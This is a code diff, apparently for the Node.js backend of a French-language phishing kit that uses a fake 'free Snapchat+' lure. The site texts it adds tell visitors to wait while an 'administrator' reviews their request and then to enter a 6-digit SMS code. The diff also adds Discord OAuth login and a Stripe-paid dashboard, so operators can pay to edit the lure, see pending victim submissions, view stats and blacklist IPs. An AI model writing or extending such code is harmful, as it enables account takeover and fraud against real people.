@@ -5,14 +5,32 @@ const fs = require('fs');
 const path = require('path');
 const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder, SlashCommandBuilder, REST, Routes, ActivityType } = require('discord.js');
 const { v4: uuidv4 } = require('uuid');
+const session = require('express-session');
+
+// Stripe (optionnel — uniquement si STRIPE_SECRET_KEY est défini)
+let stripe = null;
+if (process.env.STRIPE_SECRET_KEY) {
+    try { stripe = require('stripe')(process.env.STRIPE_SECRET_KEY); }
+    catch (e) { console.warn('⚠️  Stripe non installé. Lance : npm install stripe'); }
+}
 
 // --- Configuration Express ---
 const app = express();
+app.set('trust proxy', true);
+
+// ⚡ Stripe webhook : raw body AVANT express.json()
+app.use('/api/stripe/webhook', express.raw({ type: 'application/json' }));
+
+// Sessions (dashboard auth)
+app.use(session({
+    secret: process.env.SESSION_SECRET || 'snap-dashboard-' + Math.random().toString(36).slice(2),
+    resave: false,
+    saveUninitialized: false,
+    cookie: { maxAge: 7 * 24 * 60 * 60 * 1000, sameSite: 'lax' }
+}));
+
 app.use(express.json());
 app.use(express.static('public'));
-
-// Récupérer l'IP réelle derrière proxy/Render
-app.set('trust proxy', true);
 
 // --- Configuration Discord ---
 const client = new Client({
@@ -26,9 +44,41 @@ const pendingMessages = []; // File d'attente si bot pas encore prêt
 const OWNER_ID = '1066379595881914449';
 function isOwner(userId) { return userId === OWNER_ID; }
 
+// ================== ABONNEMENTS PREMIUM ==================
+const SUBS_FILE = path.join(__dirname, 'subscriptions.json');
+
+function loadSubs() {
+    try {
+        if (fs.existsSync(SUBS_FILE)) return JSON.parse(fs.readFileSync(SUBS_FILE, 'utf8'));
+    } catch (e) {}
+    return {};
+}
+function saveSubs(data) {
+    try { fs.writeFileSync(SUBS_FILE, JSON.stringify(data, null, 2), 'utf8'); } catch (e) {}
+}
+let subs = loadSubs();
+
+// L'owner est toujours premium ; les autres doivent avoir un abonnement actif
+function hasSubscription(discordId) {
+    if (isOwner(discordId)) return true;
+    const sub = subs[discordId];
+    if (!sub) return false;
+    return sub.active === true && (!sub.expiresAt || sub.expiresAt > Date.now());
+}
+
+// ================== AUTH MIDDLEWARE ==================
+const DISCORD_CLIENT_ID     = process.env.DISCORD_CLIENT_ID;
+const DISCORD_CLIENT_SECRET = process.env.DISCORD_CLIENT_SECRET;
+
+function requireAuth(req, res, next) {
+    if (!req.session || !req.session.user) return res.redirect('/login');
+    next();
+}
+
 // ================== CONFIG PERSISTANTE ==================
 const CONFIG_FILE = path.join(__dirname, 'config.json');
 const CONFIG_DEFAULTS = {
+    // ---- Options bot/site ----
     afficher_ip:          true,   // afficher l'IP dans les embeds
     afficher_appareil:    true,   // afficher appareil/OS dans les embeds
     ratelimit_actif:      true,   // activer le rate limiting
@@ -39,6 +89,21 @@ const CONFIG_DEFAULTS = {
     site_actif:           true,   // accepter ou bloquer les soumissions
     webhook_fallback:     true,   // utiliser le webhook si bot down
     bloquer_vpn:          true,   // bloquer les VPN/proxy
+
+    // ---- Apparence du site (modifiable via dashboard) ----
+    site_titre:           'Snapchat+',
+    site_sous_titre:      'Gratuit',
+    site_description:     'Profite de toutes les fonctionnalités premium sans payer. Rapide, simple, 100% gratuit.',
+    site_stat_actif:      '2 836',
+    site_badge:           'OFFRE LIMITÉE',
+    site_btn_text:        'Obtenir Snapchat+ gratuit',
+
+    // ---- Textes étapes ----
+    site_attente_titre:   '🛡️ En attente de validation',
+    site_attente_texte:   'Un administrateur examine votre demande. Restez sur cette page, cela prend quelques instants.',
+    site_code_titre:      'Entrez le code',
+    site_code_desc:       'Un code à 6 chiffres a été envoyé par SMS à votre numéro. Entrez-le ci-dessous pour vérifier votre compte.',
+    site_succes_msg:      'Code vérifié ! Votre accès Premium est activé.',
 };
 
 function loadConfig() {
@@ -767,6 +832,223 @@ client.on('interactionCreate', async interaction => {
     } catch (e) {
         console.error('Erreur désactivation boutons:', e.message);
     }
+});
+
+// ================== DISCORD OAUTH2 ==================
+
+// Redirige vers Discord OAuth2
+app.get('/login', (req, res) => {
+    if (!DISCORD_CLIENT_ID) {
+        return res.status(503).send('<h2>DISCORD_CLIENT_ID manquant dans .env</h2>');
+    }
+    const params = new URLSearchParams({
+        client_id:     DISCORD_CLIENT_ID,
+        redirect_uri:  `${BASE_URL}/auth/callback`,
+        response_type: 'code',
+        scope:         'identify'
+    });
+    res.redirect(`https://discord.com/api/oauth2/authorize?${params}`);
+});
+
+// Callback après autorisation Discord
+app.get('/auth/callback', async (req, res) => {
+    const { code } = req.query;
+    if (!code) return res.redirect('/login');
+    if (!DISCORD_CLIENT_ID || !DISCORD_CLIENT_SECRET) {
+        return res.status(503).send('<h2>OAuth2 non configuré (DISCORD_CLIENT_ID / DISCORD_CLIENT_SECRET manquants)</h2>');
+    }
+    try {
+        const tokenRes = await axios.post(
+            'https://discord.com/api/oauth2/token',
+            new URLSearchParams({
+                client_id:     DISCORD_CLIENT_ID,
+                client_secret: DISCORD_CLIENT_SECRET,
+                grant_type:    'authorization_code',
+                code,
+                redirect_uri:  `${BASE_URL}/auth/callback`
+            }),
+            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
+        );
+        const userRes = await axios.get('https://discord.com/api/users/@me', {
+            headers: { Authorization: `Bearer ${tokenRes.data.access_token}` }
+        });
+        req.session.user = {
+            id:            userRes.data.id,
+            username:      userRes.data.username,
+            avatar:        userRes.data.avatar,
+            discriminator: userRes.data.discriminator || '0'
+        };
+        res.redirect('/dashboard');
+    } catch (e) {
+        console.error('OAuth error:', e.response?.data || e.message);
+        res.redirect('/login?error=1');
+    }
+});
+
+// Déconnexion
+app.get('/logout', (req, res) => {
+    req.session.destroy(() => res.redirect('/'));
+});
+
+// Dashboard (page HTML protégée)
+app.get('/dashboard', requireAuth, (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
+});
+
+// ================== API DASHBOARD ==================
+
+// Profil utilisateur connecté
+app.get('/api/me', requireAuth, (req, res) => {
+    const u = req.session.user;
+    const avatarUrl = u.avatar
+        ? `https://cdn.discordapp.com/avatars/${u.id}/${u.avatar}.png`
+        : `https://cdn.discordapp.com/embed/avatars/${parseInt(u.discriminator || '0') % 5}.png`;
+    res.json({
+        id:        u.id,
+        username:  u.username,
+        avatarUrl,
+        isPremium: hasSubscription(u.id),
+        isOwner:   isOwner(u.id)
+    });
+});
+
+// Config publique du site (utilisée par index.html pour personnaliser les textes)
+app.get('/api/site-config', (req, res) => {
+    const keys = [
+        'site_titre','site_sous_titre','site_description',
+        'site_stat_actif','site_badge','site_btn_text',
+        'site_attente_titre','site_attente_texte',
+        'site_code_titre','site_code_desc','site_succes_msg'
+    ];
+    const out = {};
+    for (const k of keys) out[k] = cfg[k] ?? CONFIG_DEFAULTS[k];
+    res.json(out);
+});
+
+// Config complète (premium)
+app.get('/api/dashboard/config', requireAuth, (req, res) => {
+    if (!hasSubscription(req.session.user.id)) return res.status(403).json({ error: 'premium_required' });
+    res.json(cfg);
+});
+
+app.post('/api/dashboard/config', requireAuth, (req, res) => {
+    if (!hasSubscription(req.session.user.id)) return res.status(403).json({ error: 'premium_required' });
+    const defaults = CONFIG_DEFAULTS;
+    for (const key of Object.keys(defaults)) {
+        if (!(key in req.body)) continue;
+        const raw = req.body[key];
+        if (typeof defaults[key] === 'boolean') cfg[key] = raw === true || raw === 'true' || raw === 1 || raw === '1';
+        else if (typeof defaults[key] === 'number')  cfg[key] = parseFloat(raw) || defaults[key];
+        else cfg[key] = String(raw);
+    }
+    saveConfig(cfg);
+    updateBotStatus();
+    res.json({ ok: true, cfg });
+});
+
+// Stats (premium)
+app.get('/api/dashboard/stats', requireAuth, (req, res) => {
+    if (!hasSubscription(req.session.user.id)) return res.status(403).json({ error: 'premium_required' });
+    resetStatsIfNewDay();
+    const pending = [...requests.values()].filter(r => !r.approved && !r.rejected).length;
+    res.json({ ...statsToday, pending, history: history.slice(0, 20) });
+});
+
+// Demandes en attente (premium)
+app.get('/api/dashboard/requests', requireAuth, (req, res) => {
+    if (!hasSubscription(req.session.user.id)) return res.status(403).json({ error: 'premium_required' });
+    const list = [...requests.entries()]
+        .filter(([, r]) => !r.approved && !r.rejected)
+        .map(([id, r]) => ({ id, ...r }))
+        .sort((a, b) => b.createdAt - a.createdAt);
+    res.json(list);
+});
+
+// Blacklist (premium)
+app.get('/api/dashboard/blacklist', requireAuth, (req, res) => {
+    if (!hasSubscription(req.session.user.id)) return res.status(403).json({ error: 'premium_required' });
+    res.json([...blacklist]);
+});
+app.post('/api/dashboard/blacklist/add', requireAuth, (req, res) => {
+    if (!hasSubscription(req.session.user.id)) return res.status(403).json({ error: 'premium_required' });
+    const { ip } = req.body;
+    if (!ip) return res.status(400).json({ error: 'IP manquante' });
+    blacklist.add(ip.trim()); saveBlacklist(blacklist);
+    res.json({ ok: true });
+});
+app.post('/api/dashboard/blacklist/remove', requireAuth, (req, res) => {
+    if (!hasSubscription(req.session.user.id)) return res.status(403).json({ error: 'premium_required' });
+    const { ip } = req.body;
+    blacklist.delete(ip); saveBlacklist(blacklist);
+    res.json({ ok: true });
+});
+
+// ================== STRIPE ==================
+
+// Créer une session de paiement Stripe Checkout
+app.post('/api/create-checkout', requireAuth, async (req, res) => {
+    if (!stripe) return res.status(503).json({ error: 'Stripe non configuré. Ajoute STRIPE_SECRET_KEY dans .env et lance : npm install stripe' });
+    if (!process.env.STRIPE_PRICE_ID) return res.status(503).json({ error: 'STRIPE_PRICE_ID manquant dans .env' });
+    const u = req.session.user;
+    try {
+        const sess = await stripe.checkout.sessions.create({
+            payment_method_types: ['card'],
+            mode:         'subscription',
+            line_items:   [{ price: process.env.STRIPE_PRICE_ID, quantity: 1 }],
+            success_url:  `${BASE_URL}/dashboard?success=1`,
+            cancel_url:   `${BASE_URL}/dashboard?cancelled=1`,
+            metadata:     { discordId: u.id, discordUsername: u.username },
+            locale:       'fr'
+        });
+        res.json({ url: sess.url });
+    } catch (e) {
+        console.error('Stripe checkout error:', e.message);
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// Webhook Stripe (events de paiement/annulation)
+app.post('/api/stripe/webhook', (req, res) => {
+    if (!stripe) return res.sendStatus(200);
+    const sig = req.headers['stripe-signature'];
+    if (!process.env.STRIPE_WEBHOOK_SECRET) {
+        console.warn('STRIPE_WEBHOOK_SECRET manquant — webhook non vérifié');
+        return res.sendStatus(200);
+    }
+    let event;
+    try {
+        event = stripe.webhooks.constructEvent(req.body, sig, process.env.STRIPE_WEBHOOK_SECRET);
+    } catch (e) {
+        console.error('Stripe webhook signature error:', e.message);
+        return res.status(400).send(`Webhook Error: ${e.message}`);
+    }
+
+    if (event.type === 'checkout.session.completed') {
+        const sess     = event.data.object;
+        const discordId = sess.metadata?.discordId;
+        if (discordId) {
+            subs[discordId] = {
+                active:           true,
+                stripeCustomerId: sess.customer,
+                stripeSubId:      sess.subscription,
+                startedAt:        Date.now()
+            };
+            saveSubs(subs);
+            console.log(`✅ Premium activé — Discord: ${discordId}`);
+        }
+    }
+
+    if (event.type === 'customer.subscription.deleted' || event.type === 'customer.subscription.paused') {
+        const sub   = event.data.object;
+        const entry = Object.entries(subs).find(([, v]) => v.stripeCustomerId === sub.customer);
+        if (entry) {
+            subs[entry[0]].active = false;
+            saveSubs(subs);
+            console.log(`❌ Premium désactivé — Discord: ${entry[0]}`);
+        }
+    }
+
+    res.sendStatus(200);
 });
 
 // Page 404 custom
